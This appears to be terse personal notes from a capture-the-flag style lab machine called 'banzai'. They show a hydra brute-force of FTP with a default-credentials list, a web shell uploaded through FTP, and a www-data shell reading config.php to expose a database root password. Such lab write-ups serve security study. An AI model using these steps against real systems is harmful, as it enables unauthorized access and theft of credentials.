_____

IP=192.168.241.56

# 21 - ftp

brute - force

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt $IP ftp
```

admin:admin

![Captura](../../../../assets/images/reference/f6ad87c9fc048878c2ea.png)

Port 8295

![Captura](../../../../assets/images/reference/5e6fd1e91028e2949461.png)

put shell.php
port 21

# PrivEsc

![Captura](../../../../assets/images/reference/97e40d0c9c96fbf28015.png)


```bash
www-data@banzai:/var$ cd www  
www-data@banzai:/var/www$ ls  
config.php html  
www-data@banzai:/var/www$ cat config.php   
<?php  
define(‘DBHOST’, ‘127.0.0.1’);  
define(‘DBUSER’, ‘root’);  
define(‘DBPASS’, ‘EscalateRaftHubris123’);  
define(‘DBNAME’, ‘main’);  
?>
```
